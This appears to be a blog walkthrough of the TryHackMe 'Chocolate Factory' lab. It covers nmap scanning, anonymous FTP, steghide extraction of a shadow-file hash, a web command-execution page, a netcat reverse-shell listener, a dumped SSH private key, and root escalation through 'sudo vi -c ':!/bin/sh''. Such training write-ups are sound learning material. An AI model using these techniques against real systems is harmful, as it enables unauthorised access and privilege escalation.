---
title: "[TryHackMe] Chocolate Factory - Walkthrough"
date: 2021-05-11T20:19:10+01:00
author: ascrivins
description: "Beginner friendly room full of chocolate."
ShowToc: true
ShowBreadCrumbs: true
ShowReadingTime: true
ShowPostNavLinks: true
ShowShareButtons: true
categories: ["TryHackMe"]
tags: ["Walkthrough", "nmap", "dirbuster", "ssh", "Privilege Escalation", "Stenography"]
cover:
   image: "/post_images/chocolate/banner.png"
---

# Intro
Link to room: https://tryhackme.com/room/chocolatefactory 

-------------------

# Reconnaissance
## nmap Scan
The nmap scan takes a while to run. The reason why can be seen from the results, we are given a bulk of open ports but we are only interested in some of them.

    └─$ nmap -sC -sV 10.10.239.50 
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-11 19:10 BST
    Nmap scan report for 10.10.239.50
    Host is up (0.088s latency).
    Not shown: 989 closed ports
    PORT    STATE SERVICE    VERSION
    21/tcp  open  ftp        vsftpd 3.0.3
    |_auth-owners: ERROR: Script execution failed (use -d to debug)
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:10.8.113.148
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 4
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    |_auth-owners: ERROR: Script execution failed (use -d to debug)
    | ssh-hostkey: 
    |   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)
    |   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)
    |_  256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)
    80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))
    |_auth-owners: ERROR: Script execution failed (use -d to debug)
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    100/tcp open  newacct?
    |_auth-owners: ERROR: Script execution failed (use -d to debug)
    | fingerprint-strings: 
    |   GenericLines, NULL: 
    |     "Welcome to chocolate room!! 
    |     ___.---------------.
    |     .'__'__'__'__'__,` . ____ ___ \r
    |     _:\x20 |:. \x20 ___ \r
    |     \'__'__'__'__'_`.__| `. \x20 ___ \r
    |     \'__'__'__\x20__'_;-----------------`
    |     \|______________________;________________|
    |     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
    |_    hope you wont drown Augustus"

So we are only interested in the FTP server, the SSH port and the HTTP server. 

--------------

## FTP Server and Stenography 
The nmap scan told us the FTP server can be access with anonymous credentials and contains a file called gum_room.jpg. Let's download that.

    Connected to 10.10.239.50.
    220 (vsFTPd 3.0.3)
    Name (10.10.239.50:andy): anonymous
    331 Please specify the password.
    Password:
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> ls
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    -rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
    226 Directory send OK.
    ftp> get gum_room.jpg
    local: gum_room.jpg remote: gum_room.jpg
    200 PORT command successful. Consider using PASV.
    150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
    226 Transfer complete.

We can perform some Stenography on the downloaded photo to extract any info hidden in the metadata. 

Firstly with exiftool:

    └─$ exiftool gum_room.jpg 
    ExifTool Version Number         : 12.16
    File Name                       : gum_room.jpg
    Directory                       : .
    File Size                       : 204 KiB
    File Modification Date/Time     : 2021:05:11 19:17:38+01:00
    File Access Date/Time           : 2021:05:11 19:17:38+01:00
    File Inode Change Date/Time     : 2021:05:11 19:17:38+01:00
    File Permissions                : rw-r--r--
    File Type                       : JPEG
    File Type Extension             : jpg
    MIME Type                       : image/jpeg
    Exif Byte Order                 : Big-endian (Motorola, MM)
    Image Width                     : 1920
    Image Height                    : 1080
    Encoding Process                : Baseline DCT, Huffman coding
    Bits Per Sample                 : 8
    Color Components                : 3
    Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
    Image Size                      : 1920x1080
    Megapixels                      : 2.1

Then using steghide with a blank passphrase:

    └─$ steghide extract -sf gum_room.jpg   
    Enter passphrase: 
    wrote extracted data to "b64.txt".
    └─$ cat b64.txt 
    ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6
    KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4
    MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5
    OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpuZXdzOio6MTgzODA6MDo5OTk5OTo3
    [Redacted]

Decoding the base64, we get a shadow file with a hashed password for Charlie:

    ...
    i2psvc:*:18382:0:99999:7:::
    dradis:*:18382:0:99999:7:::
    beef-xss:*:18382:0:99999:7:::
    geoclue:*:18382:0:99999:7:::
    lightdm:*:18382:0:99999:7:::
    king-phisher:*:18382:0:99999:7:::
    systemd-coredump:!!:18396::::::
    _rpc:*:18451:0:99999:7:::
    statd:*:18451:0:99999:7:::
    _gvm:*:18496:0:99999:7:::
    charlie:$6$CZJnCPeQ[Redacted]yIJWE82X/:18535:0:99999:7:::

Using john or hashcat, this password can be decrypted. 

---------------

## Dirbuster 
The HTTP server landing page looks like this:

![Main page](/post_images/chocolate/home.png)

Running a dirbuster scan on this gives a /home.php page that bypasses the login validation. 

![dirbuster](/post_images/chocolate/dirbuster.png)

------------


# Exploitation
## Basic Commands
The /home.php has an input that allows us to run commands directly on the host server. 

![Command page](/post_images/chocolate/command.png)

The black font on the background makes the response difficult to see so I've written out the responses here:

    ls
    home.jpg home.php image.png index.html index.php.bak key_rev_key validate.php

Reading out rev_key_rev, we find the key we've been looking for:

    cat key_rev_key
     ELF>�@�@8 @@@@��888� � � � � x� � � � ��TTTDDP�td� � � <<Q�tdR�td� � 
     � hh/lib64/ld-linux-x86-64.so.2GNUGNU�s�ŗ5 tz�~������ 0MF� � 
     7"libc.so.6__isoc99_scanfputs__stack_chk_failprintf__cxa_finalizestrcmp__l
     ibc_start_mainGLIBC_2.7GLIBC_2.4GLIBC_2.2.5_ITM_deregisterTMCloneTable__gm
     on_start___ITM_registerTMCloneTableii _ii iui s� �� `  � � � �  �  � 
     � � � � H��H�� H��t��H����5j �%l @�%j h������%b h������%Z h������%R 
     h�����%J h�����%b f�1�I��^H��H���PTL�*H� �H�=�� �DH�=9 UH�1 H9�H��t
     H�� H��t ]��f.�]�@f.�H�=� H�5� UH)�H��H��H��H��?H�H��tH�� H��t]��f�]�@f.��=� u/H�=� UH��tH�=� � ����H����� ]����f
     DUH��]�f���UH��H��@�}�H�u�dH�%(H�E�1�H�=)�����H�E�H��H�=#
     �����H�E�H�5H���l�����u5H�= ��G���H�=(��6���H�=G��%����H�=D
     ������H�U�dH3%(t�������f.�f�AWAVI��AUATL�% UH�- SA��I��L)�H��H��
     �w���H��t 1��L��L��D��A��H��H9�u�H��[]A\A]A^A_Ðf.���H��H���Enter 
     your name: %slaksdhfas congratulations you have found the key: b'-
     VkgXh[Redacted]b8ABXeQuvhcGSQzY=' Keep its safeBad name!;8
     �������������T���������L���,zRx�����+zRx�$���`FJw�?;*3$"DH���\J����A
     �C �D|����eB�B�E �B(�H0�H8�M@r8A0A(B BBB�����` �� � ���o��� �� x��� 
     ���o���o����o���o����o� FVfv� GCC: (Ubuntu 7.5.0-3ubuntu1~18.04)...

-----------

## Reverse Shell

Using the python reserve shell found here: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp

    └─$ nc -lvnp 8080
    listening on [any] 8080 ...
    connect to [10.8.113.148] from (UNKNOWN) [10.10.239.50] 39660
    To run a command as administrator (user "root"), use "sudo <command>".
    See "man sudo_root" for details.
    
    www-data@chocolate-factory:/var/www/html$ whoami
    whoami
    www-data

-----------

## Find Key
Navigating to Charlie's home directory, there is a public/private key pair. We can make a copy of the private key on our machine and then login as charlie through ssh.

    www-data@chocolate-factory:/home/charlie$ cat teleport
    cat teleport
    -----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
    1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
    L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
    B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
    fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE

Once in as Charlie, we can read the contents of the user.txt flag:

    charlie@chocolate-factory:/home/charlie$ ls -al
    total 40
    drwxr-xr-x 5 charlie charley 4096 Oct  7  2020 .
    drwxr-xr-x 3 root    root    4096 Oct  1  2020 ..
    -rw-r--r-- 1 charlie charley 3771 Apr  4  2018 .bashrc
    drwx------ 2 charlie charley 4096 Sep  1  2020 .cache
    drwx------ 3 charlie charley 4096 Sep  1  2020 .gnupg
    drwxrwxr-x 3 charlie charley 4096 Sep 29  2020 .local
    -rw-r--r-- 1 charlie charley  807 Apr  4  2018 .profile
    -rw-r--r-- 1 charlie charley 1675 Oct  6  2020 teleport
    -rw-r--r-- 1 charlie charley  407 Oct  6  2020 teleport.pub
    -rw-r----- 1 charlie charley   39 Oct  6  2020 user.txt
    charlie@chocolate-factory:/home/charlie$ cat user.txt 
    flag{cd550[Redacted]b522d2e}

------------

# Privilege Escalation   
## Sudo -l 
 Running sudo -l tells us we can use vi with sudo privileges:

     charlie@chocolate-factory:/home/charlie$ sudo -l
    Matching Defaults entries for charlie on chocolate-factory:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User charlie may run the following commands on chocolate-factory:
        (ALL : !root) NOPASSWD: /usr/bin/vi

Checking GTFOBins, we get a command that will give is a reverse shell.

--------------

## Root Shell
charlie@chocolate-factory:/$ sudo vi -c ':!/bin/sh' /dev/null

    # whoami
    root
    # cd /root
    # ls -al
    total 52
    drwx------  6 root    root     4096 May 11 18:39 .
    drwxr-xr-x 24 root    root     4096 Sep  1  2020 ..
    -rw-------  1 root    root        0 Oct  7  2020 .bash_history
    -rw-r--r--  1 root    root     3106 Apr  9  2018 .bashrc
    drwx------  3 root    root     4096 Oct  1  2020 .cache
    drwx------  3 root    root     4096 Sep 30  2020 .gnupg
    drwxr-xr-x  3 root    root     4096 Sep 29  2020 .local
    -rw-r--r--  1 root    root      148 Aug 17  2015 .profile
    -rwxr-xr-x  1 charlie charley   491 Oct  1  2020 root.py
    -rw-------  1 root    root    12288 May 11 18:39 .root.txt.swp
    -rw-r--r--  1 root    root       66 Sep 30  2020 .selected_editor
    drwx------  2 root    root     4096 Sep  1  2020 .ssh

Running that root.py, we need to supply the earlier key and then we are rewarded with the root flag. 

    # python root.py
    Enter the key:  b'-VkgX[Redacted]GSQzY='
    __   __               _               _   _                 _____ _          
    \ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
     \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
      | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
      |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                                                                 
      ___                              ___   __  
     / _ \__      ___ __   ___ _ __   / _ \ / _| 
    | | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
    | |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
     \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
                                                 
    
      ____ _                     _       _       
     / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
    | |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
    | |___| | | | (_) | (_| (_) | | (_| | ||  __/
     \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
                                                 
     _____          _                    
    |  ___|_ _  ___| |_ ___  _ __ _   _  
    | |_ / _` |/ __| __/ _ \| '__| | | | 
    |  _| (_| | (__| || (_) | |  | |_| | 
    |_|  \__,_|\___|\__\___/|_|   \__, | 
                                  |___/  
    
    flag{cec591[Redacted]96b42124}

-------------
